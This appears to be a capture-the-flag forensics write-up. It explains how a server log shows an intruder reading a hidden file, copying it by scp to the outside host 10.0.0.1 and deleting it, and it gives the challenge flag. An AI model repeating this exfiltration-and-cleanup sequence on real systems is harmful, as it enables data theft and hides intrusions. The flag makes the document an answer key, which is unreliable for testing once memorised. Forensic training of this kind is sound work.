 ```
Christmas Toys Heist #4
100

Which sensitive file was compromised and in which directory is it located?

Flag format: CMCTF{filename_directorypath}

Flag example: CMCTF{3x4mp13f1l3_/mind/your/business/}

Author: t4f3

```
on server.log file, we have those line:
```
Dec 20 00:02:10 santatoys-server bash[1252]: root@santatoys-server:/root/santa/.secret/toys# ls -la
Dec 20 00:02:15 santatoys-server bash[1252]: root@santatoys-server:/root/santa/.secret/toys# cat santa_toy_flag
Dec 20 00:02:20 santatoys-server bash[1252]: root@santatoys-server:/root/santa/.secret/toys# scp santa_toy_flag 10.0.0.1:/tmp/
Dec 20 00:02:25 santatoys-server scp[1253]: santa_toy_flag                                   100%   20B  10.0KB/s   00:00
Dec 20 00:02:30 santatoys-server bash[1252]: root@santatoys-server:/root/santa/.secret/toys# rm santa_toy_flag
Dec 20 00:02:35 santatoys-server bash[1252]: root@santatoys-server:/root/santa/.secret/toys# exit
```
the attacker get santa_toy_flag file from remote server to here local machine with scp(secure copy protocole).
after that , he remove the file from server

# flag: CMCTF{santa_toy_flag_/root/santa/.secret/toys/}

